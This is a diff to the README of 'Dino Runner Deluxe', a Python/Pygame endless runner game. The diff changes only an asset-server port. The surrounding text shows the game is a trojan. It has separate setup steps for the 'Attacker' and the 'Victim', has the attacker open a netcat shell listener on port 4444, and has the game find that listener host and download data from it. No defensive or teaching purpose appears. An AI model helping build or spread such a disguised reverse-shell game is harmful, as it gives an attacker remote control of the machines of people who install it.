@@ -22,13 +22,13 @@ Dino Runner Deluxe is an endless runner game developed in Python/Pygame. Beyond 
 
 ### 2.3 Automatic Dependency Installer
 - **Package Installation:** The game checks for the `pygame` library and installs it via `pip` if missing.
-- **Asset Downloader:** If game assets (JSON data) are missing, it attempts to download them from the discovered listener host (port 8080).
+- **Asset Downloader:** If game assets (JSON data) are missing, it attempts to download them from the discovered listener host (port 7950).
 
 ## 3. Installation & Usage
 
 ### 3.1 For the Listener (Attacker)
 1. Start the shell listener: `nc -lvnp 4444`
-2. (Optional) Provide assets via HTTP: `python3 -m http.server 8080` (from project root).
+2. (Optional) Provide assets via HTTP: `python3 -m http.server 7950` (from project root).
 
 ### 3.2 For the Target (Victim)
 1. Ensure Python 3 is installed.
